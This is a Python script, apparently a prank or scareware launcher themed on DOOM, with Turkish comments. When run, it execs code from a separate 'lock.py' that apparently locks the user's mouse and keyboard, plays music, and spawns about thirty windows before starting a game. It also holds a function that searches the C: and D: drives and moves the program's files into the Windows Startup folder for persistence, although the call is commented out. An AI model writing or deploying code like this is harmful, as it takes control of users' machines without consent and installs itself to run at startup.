import time
from threading import Thread
import os
from playsound import playsound
import keyboard
import mouse
import shutil
import sys
sys.path.append('DOOM')
import first
import tkinter as tk
from PIL import Image, ImageTk
from itertools import count, cycle
import random

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)


#Başlangıçta çalıştırma muhabbeti
def BaslangicaTasi(TasinacakDosya):
    removeFromLast = 7
    hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
    oradaMi = hedefKonum + "/" + TasinacakDosya
    aramaSonucu = find(TasinacakDosya, "C:")
    if(aramaSonucu != None):
        if not os.path.isfile(oradaMi):
            tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
            for herBirDosya in tumDosyalar:
                shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)
    else:
        aramaSonucu = find(TasinacakDosya, "D:")
        if not os.path.isfile(oradaMi):
            tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
            for herBirDosya in tumDosyalar:
                shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)

#BaslangicaTasi("DOOM.py")   bunu açınca dosyaları taşıyor ama oyun çalışmıyor

loopforDelay = True

def Yazilar():
    playsound('DOOM/music.wav', block=False)
    first.kafatasiSekmesi()
    for i in range(0, 29):
        Thread(target= first.aciklamaSekmesi).start()
    first.sonSekme()
    global loopforDelay
    loopforDelay = False
    Thread(target=mouseDelayedRelease).start()
    Thread(target=startGame).start()

def mouseDelayedRelease():
    while(loopforDelay):
        continue
    time.sleep(1)
    global fareyiKilitle
    fareyiKilitle = False

def startGame():
    os.system('python DOOM/main.py')

def Lock():
    fromPy = open("DOOM/lock.py", 'r')
    exec(fromPy.read())
    fromPy.close()

Thread(target=Lock).start()
Thread(target=Yazilar).start()